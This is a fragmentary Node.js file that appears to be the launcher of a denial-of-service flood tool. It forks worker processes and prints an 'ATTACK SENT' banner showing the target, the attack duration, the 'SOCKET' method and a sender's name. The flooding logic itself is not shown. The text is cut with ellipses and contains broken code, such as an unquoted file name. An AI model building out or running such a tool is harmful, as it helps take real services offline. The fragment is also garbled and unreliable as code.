...
'*'
 ...
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(ua.txt, "utf-8").toString().split(/\r?\n/);
 }
...
if (cluster.isMaster) {
  for (let counter = 1; counter <= args.threads; counter++) {
    console.clear()
console.log('IUGHAN | SOCKET');
console.log('\x1b[38;2;186;89;196m                    ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═\x1b[38;2;255;0;55m  ╔═╗╔═╗╔╗╔╔╦╗');
console.log(' \x1b[38;2;186;89;196m                   ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \x1b[38;2;255;0;55m ╚═╗║╣ ║║║ ║ ');
console.log(' \x1b[38;2;186;89;196m                   ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \x1b[38;2;255;0;55m ╚═╝╚═╝╝╚╝ ╩');
console.log(' \x1b[38;2;186;89;196m           ╦══════════════════════════════════════════════╦');
console.log('\x1b[38;2;255;0;55m                   Target:'.yellow + process.argv[2]);
console.log('\x1b[38;2;255;0;55m                   Time:'.yellow + process.argv[3]);
console.log('\x1b[38;2;109;166;207m                   Methods:\x1b[38;2;255;0;55m SOCKET');
console.log('\x1b[38;2;109;166;207m                   VIP: \x1b[38;2;255;0;55m[True]');
console.log('\x1b[38;2;109;166;207m                SENT BY: \x1b[38;2;255;0;55m[Minh Quân]');
console.log('    \x1b[38;2;186;89;196m        ╚══════════════════════════════════════════════╝');
    cluster.fork();
  }
} else {
